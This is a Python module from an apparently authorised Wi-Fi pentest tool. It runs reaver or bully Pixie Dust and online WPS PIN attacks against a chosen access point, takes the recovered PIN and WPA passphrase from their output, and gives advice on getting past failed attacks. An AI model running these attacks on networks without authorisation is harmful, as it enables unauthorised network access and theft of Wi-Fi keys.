"""WPS attacks against a single, scope-authorized target BSSID.

Wraps the installed, trusted Kali tools rather than downloading and executing
third-party scripts:

  * reaver  -- Pixie Dust (offline, via `-K 1`) and online WPS PIN attack
  * bully   -- alternative engine (Pixie Dust via `-d`)

This is the same Pixie Dust attack that OneShot automates. The interface must
already be in monitor mode (see app.adapter.set_monitor_mode). Every attack is
gated on the engagement scope by the API layer before start() is called, and
each start/stop is written to the audit log.
"""

import re
import subprocess
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from threading import Lock

from app import procs

ATTACKS = ("pixie", "pin")
ENGINES = ("reaver", "bully")


class WpsCommandError(Exception):
    pass


# reaver: "[+] WPS PIN: '12345670'"  /  bully: "[+] PIN : '12345670'"
_PIN_RE = re.compile(r"WPS PIN\s*:\s*'?(\d{4,8})'?|(?<![A-Za-z])PIN\s*:\s*'?(\d{4,8})'?", re.IGNORECASE)
# reaver: "[+] WPA PSK: 'secret'"  /  bully: "[+] KEY : 'secret'"
_PSK_RE = re.compile(r"(?:WPA PSK|PSK|KEY)\s*:\s*'([^']*)'", re.IGNORECASE)


def _channel_is_5ghz(channel: str) -> bool:
    """WPS on a 5 GHz AP needs reaver/bully told to use 5 GHz channels, otherwise
    they only ever tune the 2.4 GHz radio and the attack silently never associates.
    2.4 GHz is channels 1-14; 5 GHz is 32+."""
    try:
        return int(str(channel).strip()) > 14
    except (TypeError, ValueError):
        return False


@dataclass
class WpsState:
    running: bool
    interface: str | None
    bssid: str | None
    attack: str | None
    engine: str | None
    pin: str | None
    psk: str | None
    output: list[str] = field(default_factory=list)
    diagnostic: str | None = None  # plain-language "why nothing happened" hint


def _build_command(interface: str, bssid: str, channel: str, attack: str, engine: str) -> list[str]:
    if attack not in ATTACKS:
        raise WpsCommandError(f"Unknown attack '{attack}' (expected one of {ATTACKS})")
    five_ghz = _channel_is_5ghz(channel)
    if engine == "reaver":
        # -vv verbose, -N no NACKs (helps some pixie targets). On reaver 1.6.6
        # (Kali) -K/--pixie-dust is a BOOLEAN flag — the old fork's "-K 1" leaves a
        # stray "1" positional arg, so we pass a bare -K.
        cmd = ["sudo", "-n", "reaver", "-i", interface, "-b", bssid, "-c", str(channel), "-vv", "-N"]
        if five_ghz:
            cmd += ["-5"]
        if attack == "pixie":
            cmd += ["-K"]
        return cmd
    if engine == "bully":
        # -F force past warnings; -d = --pixiewps.
        cmd = ["sudo", "-n", "bully", interface, "-b", bssid, "-c", str(channel), "-v", "3", "-F"]
        if five_ghz:
            cmd += ["-5"]
        if attack == "pixie":
            cmd += ["-d"]
        return cmd
    raise WpsCommandError(f"Unknown engine '{engine}' (expected one of {ENGINES})")


def _park_channel(interface: str, channel: str) -> None:
    """Best-effort: pin the monitor interface to the target's channel before the
    attack. Some drivers (rt2800usb / Ralink) don't reliably follow reaver's own
    channel switch, which surfaces as 'failed to associate'. Never fatal — reaver
    also sets -c, so if this can't run the attack still proceeds."""
    if not str(channel).strip():
        return
    try:
        subprocess.run(
            ["sudo", "-n", "iw", "dev", interface, "set", "channel", str(channel).strip()],
            capture_output=True, timeout=10,
        )
    except (OSError, subprocess.SubprocessError):
        pass


def _diagnose(raw: str, running: bool, has_result: bool) -> str | None:
    """Turn reaver/bully's noisy output into one plain-language reason the attack
    isn't producing a PIN/PSK. This is the answer to 'pixie kam nahi kar raha' —
    it separates 'AP not vulnerable' from 'the radio isn't actually attacking'."""
    if has_result:
        return None
    low = raw.lower()
    # AP is defending itself — WPS locked or rate-limited.
    if "rate limiting" in low or "ap rate limiting" in low or "lock" in low:
        return (
            "The AP has locked WPS / is rate-limiting attempts — Pixie Dust can't proceed. "
            "Wait for the lockout to clear (often 60s–several minutes) or try later."
        )
    # Reaver ran Pixie Dust but the AP's nonces weren't predictable.
    if "pin not found" in low or "pixiewps fail" in low or "wps pin not found" in low or "not vulnerable" in low:
        return (
            "The AP completed the WPS exchange but is NOT Pixie-Dust vulnerable "
            "(its keys aren't predictable). Try the online PIN attack, or a different target."
        )
    # Never got a working link to the AP — almost always a radio/monitor problem.
    assoc_fail = low.count("failed to associate") + low.count("receive timeout") + low.count("unable to get beacon")
    if assoc_fail >= 3:
        return (
            "Can't associate with the AP — this is a monitor-mode / injection problem, not the AP. "
            "Check: the adapter actually injects (Ralink RT5370/rt2800usb & Atheros are good; many "
            "RTL8821AU builds don't), it's in monitor mode, on the AP's channel, and in range. "
            "If NetworkManager keeps reverting monitor mode, use 'Kill interfering processes' in Setup."
        )
    if not running and raw.strip():
        return "The attack stopped without recovering a PIN/PSK — see the live output above for why."
    return None


class WpsManager:
    def __init__(self) -> None:
        self._lock = Lock()
        self._process: subprocess.Popen | None = None
        self._log_fh = None
        self._log_file: Path | None = None
        self._interface: str | None = None
        self._bssid: str | None = None
        self._attack: str | None = None
        self._engine: str | None = None

    def start(self, interface: str, bssid: str, channel: str, attack: str = "pixie", engine: str = "reaver") -> None:
        with self._lock:
            if self._process and self._process.poll() is None:
                raise RuntimeError("A WPS attack is already running")
            cmd = _build_command(interface, bssid, channel, attack, engine)
            _park_channel(interface, channel)
            tmp_dir = Path(tempfile.mkdtemp(prefix="wifiwps_"))
            self._log_file = tmp_dir / "wps.log"
            self._log_fh = open(self._log_file, "wb")
            try:
                self._process = procs.popen(cmd, stdout=self._log_fh, stderr=subprocess.STDOUT)
            except FileNotFoundError as exc:
                self._log_fh.close()
                raise WpsCommandError(f"Required tool not found: {cmd[2]}") from exc
            self._interface = interface
            self._bssid = bssid
            self._attack = attack
            self._engine = engine

    def stop(self) -> None:
        with self._lock:
            procs.terminate(self._process)  # root-owned (sudo) → killed as root
            self._process = None
            if self._log_fh:
                self._log_fh.close()
                self._log_fh = None

    def is_running(self) -> bool:
        return self._process is not None and self._process.poll() is None

    def _read_output(self) -> str:
        if not self._log_file or not self._log_file.exists():
            return ""
        return self._log_file.read_text(errors="replace")

    def status(self) -> WpsState:
        raw = self._read_output()
        pin_match = _PIN_RE.search(raw)
        pin = next((g for g in pin_match.groups() if g), None) if pin_match else None
        psk_match = _PSK_RE.search(raw)
        psk = psk_match.group(1) if psk_match else None
        lines = [ln for ln in raw.splitlines() if ln.strip()]
        running = self.is_running()
        return WpsState(
            running=running,
            interface=self._interface,
            bssid=self._bssid,
            attack=self._attack,
            engine=self._engine,
            pin=pin,
            psk=psk,
            output=lines[-40:],
            diagnostic=_diagnose(raw, running, bool(pin or psk)),
        )


wps_manager = WpsManager()
